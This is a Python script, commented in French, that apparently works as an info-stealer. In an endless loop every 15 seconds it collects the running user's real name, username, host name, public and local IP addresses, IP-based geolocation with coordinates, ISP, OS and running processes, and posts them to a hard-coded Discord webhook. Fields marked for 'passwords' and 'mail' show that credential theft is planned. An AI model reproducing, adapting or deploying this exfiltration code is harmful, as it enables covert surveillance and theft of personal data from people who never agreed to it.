import argparse
import os
import platform
import pwd
import random
import requests
import socket
import subprocess
import time
from cryptography.fernet import Fernet, InvalidToken

# Définition des arguments en ligne de commande
parser = argparse.ArgumentParser(description="Script d'envoi d'informations sur l'utilisateur à Discord.")
parser.add_argument('--keys-crypt', help="Clé de cryptage pour les données sensibles.")
args = parser.parse_args()

WEBHOOK_URL = "https://discord.com/api/webhooks/1227626927486144583/J13WghUfGp2T9yDWnXVO2X52vAA_mvbltp9ojCfidkU1auIBWOpOVl4Zcnssddta8bvK"
INTERVAL = 15
last_message_id = None

def get_ip_info(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print("Failed to retrieve IP information:", e)
        return {}

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org/?format=json")
        response.raise_for_status()
        data = response.json()
        return data["ip"]
    except requests.exceptions.RequestException as e:
        print("Failed to retrieve public IP:", e)
        return ""

def extract_name_and_surname():
    user_info = pwd.getpwuid(os.getuid())
    full_name = user_info.pw_gecos
    name, surname = full_name.split(',', 1)
    return name.strip(), surname.strip()

def send_to_discord(embed):
    global last_message_id

    payload = {"embeds": [embed]}

    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        response.raise_for_status()
        
    except requests.exceptions.RequestException as e:
        print("Failed to send message to Discord:", e)

def main():
    if args.keys_crypt:
        # Essayer de déchiffrer un message arbitraire avec la clé fournie pour vérifier si elle est valide
        cipher_suite = Fernet(args.keys_crypt.encode())
        try:
            # Ici, vous pouvez déchiffrer un message arbitraire pour valider la clé
            cipher_suite.decrypt(b"")  # Mettez ici un message à déchiffrer (peut être vide)
        except InvalidToken:
            print("Clé de cryptage invalide.")
            return
    
    while True:
        name, surname = extract_name_and_surname()
        pc_name = platform.node()
        public_ip = get_public_ip()
        ip_info = get_ip_info(public_ip)
        local_ip = socket.gethostbyname(socket.gethostname())
        username = pwd.getpwuid(os.getuid()).pw_name

        process = subprocess.Popen(['ps', '-eo', 'comm'], stdout=subprocess.PIPE)
        process_name = process.communicate()[0].decode('utf-8').strip()
        process_name = '\n'.join(process_name.splitlines()[:10])

        latitude = ip_info.get("loc", "N/A").split(",")[0]
        longitude = ip_info.get("loc", "N/A").split(",")[1]
        city = ip_info.get("city", "N/A")
        country = ip_info.get("country", "N/A")
        isp = ip_info.get("org", "N/A")

        mdp = False
        mail = False

        connected = False
        try:
            response = subprocess.check_output(['ping', '-c', '1', 'google.com'], stderr=subprocess.STDOUT)
            if '1 packets transmitted, 1 received' in response.decode('utf-8'):
                connected = True
        except subprocess.CalledProcessError:
            pass

        random_color = "%06x" % random.randint(0, 0xFFFFFF)

        os_name = platform.system()

        embed = {
            "title": "Informations sur l'utilisateur",
            "color": int(random_color, 16),
            "fields": [
                {"name": "Prénom de l'utilisateur", "value": name, "inline": True},
                {"name": "Nom de l'utilisateur", "value": surname, "inline": True},
                {"name": "Nom du PC", "value": pc_name, "inline": True},
                {"name": "Adresse IP publique", "value": public_ip, "inline": True},
                {"name": "Latitude", "value": latitude, "inline": True},
                {"name": "Longitude", "value": longitude, "inline": True},
                {"name": "Ville", "value": city, "inline": True},
                {"name": "Pays", "value": country, "inline": True},
                {"name": "Fournisseur d'accès", "value": isp, "inline": True},
                {"name": "Adresse IP locale", "value": local_ip, "inline": True},
                {"name": "Nom d'utilisateur", "value": username, "inline": True},
                {"name": "Mots de passe", "value": "Trouver" if mdp else "Pas trouver", "inline": True},
                {"name": "Connecté", "value": "Oui" if connected else "Non", "inline": True},
                {"name": "Mail", "value": "Trouver" if mail else "Pas récupérer", "inline": True},
                {"name": "Système d'exploitation", "value": os_name, "inline": True},
                {"name": "Processus en cours", "value": f"```{process_name}```"},
            ]
        }

        send_to_discord(embed)

        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
